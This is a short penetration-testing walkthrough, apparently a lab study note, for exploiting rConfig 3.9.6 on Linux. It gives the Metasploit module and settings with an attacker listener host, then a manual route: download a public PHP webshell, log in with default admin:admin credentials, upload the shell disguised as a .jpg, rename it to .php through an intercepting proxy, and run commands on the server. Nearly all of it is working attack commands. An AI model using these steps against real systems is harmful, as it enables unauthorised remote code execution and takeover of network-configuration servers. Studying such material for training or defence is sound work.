# Infiltrating Linux
```table-of-contents
```
## rConfig Exploit
### 1. Identification
- **Target:** rConfig 3.9.6
### 2. Research
```shell
searchsploit rConfig 3.9.6
# OR
msf6 > search rconfig
```
### 3. Exploitation (Metasploit)
```shell
# Select the module
use exploit/linux/http/rconfig_vendors_auth_file_upload_rce

# Configure
set RHOSTS <TARGET_IP>
set LHOST <ATTACKER_IP>

# Run
exploit
```
### 4. Authenticated Exploitation
```shell
# Download the webshell: 
wget https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php

# Browser: 10.129.73.149

# Login with --> admin:admin

# Navigate to: Devices > Vendors
    # Edit Vendor "NetVen"
    # Upload the shell as a .jpg file
# Intercept the request with BurpSuite and change the filename from .jpg to .php

# Browser: https://10.129.73.149/images/vendor/webshell.php
ls -al
```